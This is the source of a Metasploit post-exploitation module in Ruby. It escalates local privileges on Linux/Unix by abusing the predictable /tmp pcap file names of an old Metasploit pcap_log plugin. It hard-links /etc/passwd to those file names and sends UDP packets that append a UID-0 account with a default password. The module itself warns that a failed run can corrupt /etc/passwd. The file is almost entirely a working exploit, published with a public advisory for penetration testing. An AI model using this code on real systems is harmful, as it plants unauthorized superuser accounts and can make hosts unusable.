##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/priv'
require 'msf/core/exploit/local/linux'
require 'msf/core/exploit/local/unix'

class Metasploit3 < Msf::Post
  Rank = ManualRanking

  include Msf::Post::File
  include Msf::Post::Common

  include Msf::Exploit::Local::Linux
  include Msf::Exploit::Local::Unix

	def initialize(info={})
		super( update_info( info, {
				'Name'	  => 'Multi Escalate Metasploit pcap_log Local Privilege Escalation',
				'Description'   => %q{
					Metasploit < 4.4 contains a vulnerable 'pcap_log' plugin which, when used with the default settings,
					creates pcap files in /tmp with predictable file names. This exploits this by hard-linking these
					filenames to /etc/passwd, then sending a packet with a priviliged user entry contained within.
					This, and all the other packets, are appended to /etc/passwd.

          Successful exploitation results in the creation of a new superuser account.

          This module requires manual clean-up. Upon success, you should remove /tmp/msf3-session*pcap
          files and truncate /etc/passwd. Note that if this module fails, you can potentially induce
          a permanent DoS on the target by corrupting the /etc/passwd file.
        },
        'License'       => MSF_LICENSE,
        'Author'	=> [ '0a29406d9794e4f9b30b3c5d6702c708'],
        'Platform'      => [ 'linux','unix','bsd' ],
        'SessionTypes'  => [ 'shell', 'meterpreter' ],
        'References'    =>
          [
            [ 'BID', '54472' ],
            [ 'URL', 'http://0a29.blogspot.com/2012/07/0a29-12-2-metasploit-pcaplog-plugin.html'],
            [ 'URL', 'https://community.rapid7.com/docs/DOC-1946' ],
          ],
        'DisclosureDate' => "Jul 16 2012",
        'Targets'       =>
          [
            [ 'Linux/Unix Universal', {} ],
          ],
        'Stance' => Msf::Exploit::Stance::Passive,
        'DefaultTarget' => 0,
      }
      ))
      register_options(
      [
        Opt::RPORT(2940),
        OptString.new("USERNAME", [ true, "Username for the new superuser", "metasploit" ]),
        OptString.new("PASSWORD", [ true, "Password for the new superuser", "metasploit" ]),
        OptInt.new("MINUTES", [true, "Number of minutes to try to inject", 5])
      ], self)
  end

  def normalize_minutes
    datastore["MINUTES"].abs rescue 0
  end

  def run
    print_status "Setting up the victim's /tmp dir"
    initial_size = cmd_exec("cat /etc/passwd | wc -l")
    print_status "/etc/passwd is currently #{initial_size} lines long"
    i = 0
    j = 0
    loop do
      if (i == 0)
        j += 1
        break if j >= datastore['MINUTES'] + 1 # Give up after X minutes
        # 0a2940: cmd_exec is slow, so send 1 command to do all the links
        print_status "Linking /etc/passwd to predictable tmp files (Attempt #{j})"
        cmd_exec("for i in `seq 0 120` ; do ln /etc/passwd /tmp/msf3-session_`date --date=\"\$i seconds\" +%Y-%m-%d_%H-%M-%S`.pcap ; done")
      end
      current_size = cmd_exec("cat /etc/passwd | wc -l")
      if current_size == initial_size
        # PCAP is flowing
        pkt = "\n\n" + datastore['USERNAME'] + ":" + datastore['PASSWORD'].crypt("0a") + ":0:0:Metasploit Root Account:/tmp:/bin/bash\n\n"
        vprint_status("Sending /etc/passwd file contents payload to #{session.session_host}")
        udpsock = Rex::Socket::Udp.create(
        {
          'Context' => {'Msf' => framework, 'MsfExploit'=>self}
        })
        res = udpsock.sendto(pkt, session.session_host, datastore['RPORT'])
      else
        break
      end
      sleep(1) # wait a second
      i = (i+1) % 60 # increment second counter
    end

    if cmd_exec("(grep Metasploit /etc/passwd > /dev/null && echo true) || echo false").include?("true")
      print_good("Success. You should now be able to login or su to the '" + datastore['USERNAME'] + "' account")
      # TODO: Consider recording our now-created username and password as a valid credential here.
    else
      print_error("Failed, the '" + datastore['USERNAME'] + "' user does not appear to have been added")
    end
    # 0a2940: Initially the plan was to have this post module switch user, upload & execute a new payload
    #	  However beceause the session is not a terminal, su will not always allow this.
  end
end
